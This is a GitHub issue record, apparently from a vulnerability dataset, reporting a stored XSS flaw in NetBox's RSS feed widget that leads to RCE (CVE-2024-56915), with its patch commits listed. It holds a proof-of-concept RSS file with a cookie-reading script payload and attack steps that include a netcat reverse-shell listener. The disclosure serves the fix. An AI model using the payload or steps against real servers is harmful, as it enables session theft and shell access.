<?xml version="1.0" ?>
<ISSUE>
  <ISSUENO>18379</ISSUENO>
  <ISSUEURL>https://github.com/netbox-community/netbox/issues/18379</ISSUEURL>
  <TITLE>XSS in RSS Feed Summary Tag can lead to RCE or SuperUser Creation - CVE-2024-56915</TITLE>
  <DESCRIPTION>### Deployment Type Self-hosted ### Triage priority I'm a NetBox Labs customer ### NetBox Version 4.2.1 ### Python Version 3.12 ### Steps to Reproduce I've sent a full list of vulnerabilities I've located to security@netboxlabs.com. The report was sent late last year. I've upgaded to the latest version v4.2.1 and I've confirmed each vulnerability. A malicious RSS feed could potentially create a SuperUser or get a reverse shell via remote code execution. For that to be the case and administrator would need to have the malicious rss feed on their dashboard or have the ability to add rss widgets, create users/superusers, and/or upload scripts. `/netbox-4.2.1/netbox/templates/extras/dashboard/widgets/rssfeed.html` ```xml {% for entry in feed.entries %} &lt;div class=&quot;list-group-item px-1 py-2&quot;&gt; &lt;a href=&quot;{{ entry.link }}&quot; class=&quot;text-body&quot;&gt;{{ entry.title }}&lt;/a&gt; &lt;div class=&quot;text-secondary&quot;&gt; {{ entry.summary|safe }} &lt;/div&gt; &lt;/div&gt; ``` 1. Craft an xml file with the RSS Feed Proof of Concept code. 2. Start a python3 web server on attacker server in the directory hosting the xml file. `python3 -m http.server 80` 1. Navigate to the NetBox dashboard and add an RSS widget. 2. Edit the RSS widget to point to the attacker controlled IP address and save. 3. Refresh the Dashboard. ### **RSS Feed Proof of Concept** A general proof of concept is provided below. The SessionID cookie is being protected by httponly flag. The alternative scripts allow the attacker to perform remote code execution for shell access on the NetBox server and create a new superuser but I don't believe I should post them here. ```xml &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;rss version=&quot;2.0&quot;&gt; &lt;channel&gt; &lt;title&gt;Sample RSS Feed&lt;/title&gt; &lt;link&gt;https://www.example.com&lt;/link&gt; &lt;description&gt;Example RSS feed with a summary&lt;/description&gt; &lt;language&gt;en-us&lt;/language&gt; &lt;pubDate&gt;Sat, 23 Nov 2024 00:00:00 GMT&lt;/pubDate&gt; &lt;item&gt; &lt;title&gt; Blog Post&lt;/title&gt; &lt;link&gt;https://www.example.com/first-blog-post&lt;/link&gt; &lt;guid&gt;https://www.example.com/first-blog-post&lt;/guid&gt; &lt;pubDate&gt;Sat, 23 Nov 2024 12:00:00 GMT&lt;/pubDate&gt; &lt;summary&gt;&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;This is a brief summary of the blog post.&lt;/summary&gt; &lt;/item&gt; &lt;/channel&gt; &lt;/rss&gt; ``` ###### Reproduce the Attack 1. Copy the Proof Of Concept - RSS Remote Code Execution code to an xml file. (not posting it here) 2. Edit the server_ip in the XML file to the attacker controlled IP Address. 3. Start a python3 web server in the directory hosting the xml file ```python python3 -m http.server 80 ``` 3. Start a netcat listener ```sh nc -nlvp 9006 ``` 4. Navigate to the netbox dashboard and add an RSS widget 5. Edit the RSS widget to point to the attacker controlled IP address and save. 6. Refresh the Dashboard. After a few seconds the file should be pulled from the attacker server and uploaded to the NetBox server. The shell connection should come back to the attacker controlled netcat listener ### Expected Behavior I do not expect that an external rss feed I've connected to my netbox labs source could create a superuser or get a reverse shell on my netbox server. ### Observed Behavior Remote Code Execution -&gt; Reverse Shell SuperUser was created</DESCRIPTION>
  <REPONAME>netbox</REPONAME>
  <TIMEDIFFERENCEDAYS>5</TIMEDIFFERENCEDAYS>
  <BUGGYCOMMIT>
    <MESSAGE>Migrate DEFAULT_FILE_STORAGE to STORAGES</MESSAGE>
    <SHA>50b7f46fc0971ebe6d6ea6c8a6eaf6d4de3c035d</SHA>
  </BUGGYCOMMIT>
  <PATCHCOMMITS>
    <COMMIT>
      <MESSAGE>Fixes #18379: Ensure RSS feed content within dashboard widget is sanitized</MESSAGE>
      <SHA>a2b65c685ae20ff2aaa5620600822b828294a22b</SHA>
      <PATCHEDFILES>
        <FILE>netbox/templates/extras/dashboard/widgets/rssfeed.html</FILE>
      </PATCHEDFILES>
    </COMMIT>
    <COMMIT>
      <MESSAGE>Fixes #18379: Ensure RSS feed content within dashboard widget is sanitized</MESSAGE>
      <SHA>a9f3c74b0c462e4788a7ed364039fc63c3943a21</SHA>
      <PATCHEDFILES>
        <FILE>netbox/templates/extras/dashboard/widgets/rssfeed.html</FILE>
      </PATCHEDFILES>
    </COMMIT>
    <COMMIT>
      <MESSAGE>Fixes #18379: Ensure RSS feed content within dashboard widget is sanitized</MESSAGE>
      <SHA>db694141f545abe32cf6ab81754602851db6dbcd</SHA>
      <PATCHEDFILES>
        <FILE>netbox/templates/extras/dashboard/widgets/rssfeed.html</FILE>
      </PATCHEDFILES>
    </COMMIT>
    <COMMIT>
      <MESSAGE>Fixes #18379: Ensure RSS feed content within dashboard widget is sanitized</MESSAGE>
      <SHA>50321b2cbbb5aa0edcb59e2303e5be9eaddc7f17</SHA>
      <PATCHEDFILES>
        <FILE>netbox/templates/extras/dashboard/widgets/rssfeed.html</FILE>
      </PATCHEDFILES>
    </COMMIT>
  </PATCHCOMMITS>
</ISSUE>
